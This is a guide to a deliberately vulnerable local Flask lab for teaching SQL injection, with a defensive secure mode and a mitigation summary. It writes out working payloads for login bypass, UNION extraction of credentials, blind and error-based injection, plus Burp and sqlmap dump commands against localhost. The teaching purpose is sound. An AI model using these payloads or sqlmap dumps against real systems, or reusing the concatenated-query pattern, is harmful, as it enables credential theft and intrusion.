# Phone Shop SQL Injection Security Lab — Complete Guide

> **For educational and academic use only.**
> This lab intentionally contains security vulnerabilities for learning purposes.
> Do not deploy on a public server.

---

## Table of Contents

1. [Installation & Setup](#1-installation--setup)
2. [Running the Application](#2-running-the-application)
3. [Lab Overview](#3-lab-overview)
4. [Attack Guide — All 4 SQL Injection Types](#4-attack-guide)
   - [4.1 Authentication Bypass](#41-authentication-bypass)
   - [4.2 UNION-based Injection](#42-union-based-injection-data-extraction)
   - [4.3 Blind SQL Injection](#43-blind-sql-injection)
   - [4.4 Error-based Injection](#44-error-based-injection)
5. [Burp Suite Guide](#5-burp-suite-proxy-guide)
6. [SQLMap Guide](#6-sqlmap-automated-testing)
7. [Defense Testing](#7-defense-testing-secure-mode)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Installation & Setup

### Step 1 — Install Python 3.10+

**Windows:**
1. Go to https://www.python.org/downloads/
2. Download Python 3.10 or newer
3. Run the installer — **check "Add Python to PATH"**
4. Verify: open Command Prompt and type `python --version`

**macOS:**
```bash
# Using Homebrew (recommended)
brew install python@3.11

# Or download from python.org
```

**Linux (Ubuntu/Debian):**
```bash
sudo apt update
sudo apt install python3 python3-pip python3-venv -y
python3 --version
```

---

### Step 2 — Download the Project

Place the entire `phone_shop_security_lab/` folder anywhere on your machine.

Example: `C:\Users\YourName\Desktop\phone_shop_security_lab\`

---

### Step 3 — Create a Virtual Environment

Open a terminal (Command Prompt, PowerShell, or Terminal) and navigate to the project folder:

```bash
cd phone_shop_security_lab
```

Create the virtual environment:

```bash
# Windows
python -m venv venv

# macOS / Linux
python3 -m venv venv
```

Activate the virtual environment:

```bash
# Windows (Command Prompt)
venv\Scripts\activate

# Windows (PowerShell)
venv\Scripts\Activate.ps1

# macOS / Linux
source venv/bin/activate
```

You should see `(venv)` at the start of your prompt.

---

### Step 4 — Install Dependencies

```bash
pip install -r requirements.txt
```

This installs:
- `Flask 3.0.3` — web framework
- `bcrypt 4.1.3` — password hashing (used in secure mode)

---

### Step 5 — Initialize the Database

```bash
python create_db.py
```

Expected output:
```
[*] Removed old database: shop.db   (only if it existed)
[+] Database created: shop.db
[+] Tables: users, products, consultations
[+] Sample data inserted successfully.

  ┌─────────────────────────────────────────────┐
  │          SEEDED CREDENTIALS (DEMO)          │
  │  admin  / admin123  → role: admin           │
  │  user1  / pass1     → role: customer        │
  │  alice  / alice99   → role: customer        │
  └─────────────────────────────────────────────┘
```

---

## 2. Running the Application

```bash
python app.py
```

Expected output:
```
  ╔══════════════════════════════════════════════════╗
  ║       Phone Shop SQL Injection Lab               ║
  ║       Mode: VULNERABLE ⚠                        ║
  ║       URL : http://127.0.0.1:5000               ║
  ╚══════════════════════════════════════════════════╝
```

Open your browser and go to:

```
http://127.0.0.1:5000
```

---

## 3. Lab Overview

### Endpoints

| Endpoint          | Method | Description                          | Vulnerable? |
|-------------------|--------|--------------------------------------|-------------|
| `/`               | GET    | Homepage / product listing           | No          |
| `/product/<id>`   | GET    | Product detail                       | No          |
| `/search?q=`      | GET    | Product search                       | ✅ Yes       |
| `/login`          | POST   | Authentication                       | ✅ Yes       |
| `/consult`        | POST   | Consultation form                    | ✅ Yes       |
| `/admin`          | GET    | Admin dashboard (requires login)     | No          |
| `/logout`         | GET    | Clear session                        | No          |

### Default Credentials

| Username | Password | Role     |
|----------|----------|----------|
| admin    | admin123 | admin    |
| user1    | pass1    | customer |
| alice    | alice99  | customer |

### Database Tables

```sql
users         (id, username, password, role)
products      (id, name, price, description)
consultations (id, name, phone, message)
```

---

## 4. Attack Guide

> Make sure `SECURE_MODE = False` in `config.py` before running attacks.

---

### 4.1 Authentication Bypass

**Target:** `http://127.0.0.1:5000/login`

**Concept:**
The vulnerable query is built by string concatenation:
```sql
SELECT * FROM users
WHERE username = '{username}' AND password = '{password}'
```

By injecting `' OR '1'='1` the query becomes:
```sql
SELECT * FROM users
WHERE username = '' OR '1'='1' AND password = 'anything'
```
Since `'1'='1'` is always TRUE, this returns the first user in the database (admin).

**Steps:**
1. Open `http://127.0.0.1:5000/login`
2. In the **Username** field, enter:
   ```
   ' OR '1'='1
   ```
3. In the **Password** field, enter anything:
   ```
   anything
   ```
4. Click **Sign In**

**Expected Result:** You are logged in as `admin` and redirected to `/admin`.

**Additional Payloads:**

| Payload (username field) | Effect |
|--------------------------|--------|
| `' OR '1'='1` | Login as first user |
| `admin' --` | Login as admin, ignores password check |
| `' OR 1=1 --` | Same as above |
| `admin'/*` | Comment variation |

---

### 4.2 UNION-based Injection (Data Extraction)

**Target:** `http://127.0.0.1:5000/search`

**Concept:**
The vulnerable query is:
```sql
SELECT * FROM products WHERE name LIKE '%{q}%'
```

The `products` table has 4 columns: `id, name, price, description`.
We can append a UNION SELECT to pull data from the `users` table.

**Steps:**
1. Open `http://127.0.0.1:5000/search`
2. In the search box, enter:
   ```
   ' UNION SELECT 1, username, password, role FROM users --
   ```
3. Click **Search**

**Expected Result:**
The results grid will display usernames, passwords, and roles instead of product data. You'll see all user credentials leaked:
```
admin   | admin123 | admin
user1   | pass1    | customer
alice   | alice99  | customer
```

**Why this works:**
```sql
SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1, username, password, role FROM users --%'
```
The `--` comments out the closing `%'`, and UNION appends rows from the `users` table.

**Alternative payloads:**
```sql
' UNION SELECT id, username, password, role FROM users --
```

---

### 4.3 Blind SQL Injection

**Target:** `http://127.0.0.1:5000/search`

Blind injection is used when no data is directly returned but you can infer information from the application's *behavior*.

#### Boolean-Based Blind

**Steps:**

1. Search for: `iPhone` → Note how many results appear (this is the baseline)

2. Search for:
   ```
   iPhone' AND 1=1 --
   ```
   → Same results as baseline (**TRUE condition** — query succeeds)

3. Search for:
   ```
   iPhone' AND 1=2 --
   ```
   → **No results** (**FALSE condition** — query returns nothing)

**Interpretation:**
- Results returned → condition is TRUE
- No results → condition is FALSE
- An attacker can use this to extract data one bit at a time, e.g.:
  ```sql
  iPhone' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --
  ```
  If results appear, the first character of admin's password is 'a'.

#### Time-Based Blind

**Steps:**

1. Search for:
   ```
   iPhone' AND randomblob(100000000) --
   ```
2. Observe the response time — it will be noticeably slower (1–3 seconds).

3. For even longer delay:
   ```
   iPhone' AND randomblob(500000000) --
   ```

**Interpretation:**
- Delay observed → query executed (TRUE condition reached the heavy operation)
- No delay → condition was FALSE, heavy operation was skipped
- `randomblob(N)` is SQLite's way to cause delays (MySQL uses `SLEEP(N)`)

---

### 4.4 Error-Based Injection

**Target:** `/search` or `/consult`

**Concept:**
When SQL errors are displayed to the user (visible in VULNERABLE mode), an attacker can trigger intentional errors to extract information about the database structure.

**Steps:**

1. Open `http://127.0.0.1:5000/search`
2. Search for:
   ```
   ' ORDER BY 100 --
   ```
3. You will see an error message like:
   ```
   SQL Error: 1st ORDER BY term out of range - should be between 1 and 4
   ```

**Why this is useful:**
- The error reveals the number of columns in the `products` table (4 in this case)
- This information is needed for UNION attacks (you must match the column count)
- The error message itself leaks internal database information

**Additional error payloads:**
```sql
' ORDER BY 1 --    → No error (column 1 exists)
' ORDER BY 5 --    → Error (only 4 columns)
```

Use this to count columns before crafting a UNION attack.

---

## 5. Burp Suite Proxy Guide

Burp Suite is a professional web security testing tool. Here's how to use it with this lab:

### Setup

1. **Download Burp Suite Community Edition** from https://portswigger.net/burp
2. Launch Burp Suite → Proxy tab → **Open Browser** (or configure manually)

### Configure Browser Proxy

In your browser settings, set the HTTP proxy to:
```
Host: 127.0.0.1
Port: 8080
```

### Intercept a Login Request

1. In Burp → Proxy → **Intercept is ON**
2. Go to `http://127.0.0.1:5000/login` in the proxied browser
3. Enter any credentials and click Sign In
4. Burp will capture the request. It looks like:
   ```
   POST /login HTTP/1.1
   Host: 127.0.0.1:5000
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=admin123
   ```
5. **Modify the payload:**
   Change `username=admin` to `username=' OR '1'='1`
6. Click **Forward** to send the modified request
7. The server will process the injected SQL and log you in as admin

### Use Repeater

1. Right-click the intercepted request → **Send to Repeater**
2. In the Repeater tab, modify parameters freely and resend
3. Observe the server response for each payload

### Use Intruder

1. Send the login request to Intruder
2. Highlight the `password` value → **Add §** markers
3. Load a wordlist or SQL injection payload list
4. Click **Start attack** to test multiple payloads automatically

---

## 6. SQLMap Automated Testing

SQLMap is an open-source tool that automates SQL injection detection and exploitation.

**Install SQLMap:**
```bash
pip install sqlmap
# or: git clone https://github.com/sqlmapproject/sqlmap.git
```

### Test Login Form

```bash
# Detect injection and enumerate databases
sqlmap -u "http://127.0.0.1:5000/login" \
  --data="username=admin&password=123" \
  --method=POST \
  --dbs \
  --batch
```

### Dump All Data via Consult Form

```bash
sqlmap -u "http://127.0.0.1:5000/consult" \
  --data="name=test&phone=123&message=hi" \
  --method=POST \
  --dump \
  --batch
```

### Test Search GET Parameter

```bash
sqlmap -u "http://127.0.0.1:5000/search?q=iPhone" \
  --dbs \
  --batch
```

### Dump Specific Table

```bash
sqlmap -u "http://127.0.0.1:5000/search?q=iPhone" \
  -T users \
  --dump \
  --batch
```

### Flags Explained

| Flag | Meaning |
|------|---------|
| `-u` | Target URL |
| `--data` | POST body parameters |
| `--method` | HTTP method (GET or POST) |
| `--dbs` | Enumerate databases |
| `-T users` | Target the `users` table |
| `--dump` | Dump table contents |
| `--batch` | Auto-answer prompts (non-interactive) |
| `--level=3` | Higher detection intensity |
| `--risk=2` | Use more aggressive tests |

---

## 7. Defense Testing (Secure Mode)

### Enable Secure Mode

1. Open `config.py` in a text editor
2. Change:
   ```python
   SECURE_MODE = False
   ```
   to:
   ```python
   SECURE_MODE = True
   ```
3. Save the file
4. **Restart the server** (Ctrl+C, then `python app.py`)

### What Changes in Secure Mode

| Feature | Vulnerable | Secure |
|---------|-----------|--------|
| SQL queries | String concatenation | Parameterized (`?`) |
| Password storage | Plain text | bcrypt hashed |
| SQL errors | Shown to user | Generic message only |
| Input validation | None | Length + required checks |

### Re-run All Attacks (Should All Fail)

| Attack | Vulnerable Result | Secure Result |
|--------|-------------------|---------------|
| Auth bypass `' OR '1'='1` | Logs in as admin | "Invalid username or password" |
| UNION injection | User data leaked | No results / generic error |
| Boolean blind | Results differ | Same results (input is literal) |
| Time-based blind | Noticeable delay | No delay (input treated as string) |
| Error-based `ORDER BY 100` | SQL error visible | "An error occurred. Please try again." |
| SQLMap detection | Vulnerabilities found | No injection points detected |

### How Parameterized Queries Work

**Vulnerable:**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(query)
```
If `username = "' OR '1'='1"`, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```
The injected code is executed as SQL!

**Secure:**
```python
db.execute("SELECT * FROM users WHERE username = ?", (username,))
```
The `?` placeholder tells SQLite to treat the value as **data only**, not SQL code.
Even if `username = "' OR '1'='1"`, SQLite looks for a user literally named `' OR '1'='1` — which doesn't exist.

---

## 8. Troubleshooting

### "ModuleNotFoundError: No module named 'flask'"
```bash
# Make sure your virtual environment is activated
source venv/bin/activate   # Linux/macOS
venv\Scripts\activate      # Windows

pip install -r requirements.txt
```

### "sqlite3.OperationalError: no such table: users"
```bash
python create_db.py
```
The database wasn't initialized. Run `create_db.py` first.

### Port 5000 already in use
```bash
# Find and kill the process using port 5000
# Linux/macOS:
lsof -i :5000
kill -9 <PID>

# Windows:
netstat -ano | findstr :5000
taskkill /PID <PID> /F
```

### SQLMap not finding injections
- Make sure `SECURE_MODE = False` in `config.py`
- Restart the server after changing config
- Add `--level=3 --risk=2` flags to SQLMap for more thorough scanning

### bcrypt import error
```bash
pip install bcrypt==4.1.3
```

---

## Academic Notes

### Types of SQL Injection Demonstrated

1. **Classic / In-band** — Results returned directly in HTTP response (UNION attacks)
2. **Error-based** — Error messages reveal information (`ORDER BY 100`)
3. **Boolean Blind** — Infer data from true/false response differences
4. **Time-based Blind** — Infer data from response timing differences

### OWASP Reference
SQL Injection is ranked **#3** in the OWASP Top 10 (2021): A03:2021 – Injection.
See: https://owasp.org/Top10/A03_2021-Injection/

### CWE Reference
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

### Mitigation Summary
1. **Parameterized queries** (most important)
2. **Input validation and sanitization**
3. **Least privilege** — database accounts should have minimal permissions
4. **Error handling** — never expose SQL errors to end users
5. **WAF** — Web Application Firewall as an additional layer
6. **ORM** — Use an ORM (SQLAlchemy, Django ORM) which uses parameterized queries by default
